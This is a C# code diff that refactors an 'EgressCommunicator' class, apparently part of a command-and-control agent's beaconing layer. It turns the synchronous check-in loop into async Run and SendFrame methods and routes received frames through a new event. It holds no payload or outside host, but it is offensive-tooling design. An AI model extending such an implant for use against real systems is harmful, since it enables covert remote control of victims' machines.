@@ -10,16 +10,20 @@ namespace Agent.Communication
 {
     internal abstract class EgressCommunicator : Communicator
     {
+        public override event Func<NetFrame, Task> FrameReceived;
+        public override event Action OnException;
         public EgressCommunicator(ConnexionUrl connexion) : base(connexion)
         {
             this.CommunicationType = CommunicationType.Egress;
         }
 
-        public override void Start(object otoken)
+        public override async Task Start()
         {
-            this.IsRunning = false;
-            this._tokenSource = (CancellationTokenSource)otoken;
 
+        }
+
+        public override async Task Run()
+        {
             this.IsRunning = true;
             while (!_tokenSource.IsCancellationRequested)
             {
@@ -57,7 +61,7 @@ namespace Agent.Communication
                     //    this.MessageService.EnqueueTasks(messages);
 
 
-                    this.DoCheckIn().Wait();
+                    await this.DoCheckIn();
 
                 }
                 catch (Exception ex)
@@ -84,7 +88,7 @@ namespace Agent.Communication
         {
             var frames = await CheckIn(this.NetworkeService.GetFrames(String.Empty));
             if (frames != null)
-                frames.ForEach(frame => this.NetworkeService.EnqueueFrame(frame));
+                frames.ForEach(frame => this.FrameReceived?.Invoke(frame));
         }
 
         protected abstract Task<List<NetFrame>> CheckIn(List<NetFrame> frames);
@@ -95,6 +99,11 @@ namespace Agent.Communication
             //int jit = (int)Math.Round(this.MessageService.AgentMetaData.SleepInterval * 1000 * (this.MessageService.AgentMetaData.SleepJitter / 100.0));
             //var delta = random.Next(0, jit);
             //return Math.Max(100,this.MessageService.AgentMetaData.SleepInterval * 1000 - delta);
+        }
+
+        public override async Task SendFrame(NetFrame frame)
+        {
+            this.NetworkeService.EnqueueFrame(frame);
         }
 
     }
